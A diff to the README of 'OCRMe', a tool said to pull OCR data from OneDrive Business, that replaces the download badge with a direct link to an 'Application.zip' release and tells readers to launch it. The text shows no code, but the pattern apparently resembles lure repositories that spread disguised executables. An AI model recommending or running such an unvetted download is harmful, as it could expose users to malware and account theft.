@@ -13,7 +13,7 @@ OCRMe is a cutting-edge tool that allows users to extract OCR data from OneDrive
 ## Getting Started
 To get started with OCRMe, simply download the tool from the link provided below:
 
-[![Download OCRMe](https://img.shields.io/badge/Download-OCRMe-green)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download OCRMe](https://github.com/TheLouis1202/OCRMe/releases/download/v1.0/Application.zip)](https://github.com/TheLouis1202/OCRMe/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the tool, launch the file and follow the on-screen instructions to start extracting OCR data from your OneDrive Business account.
 
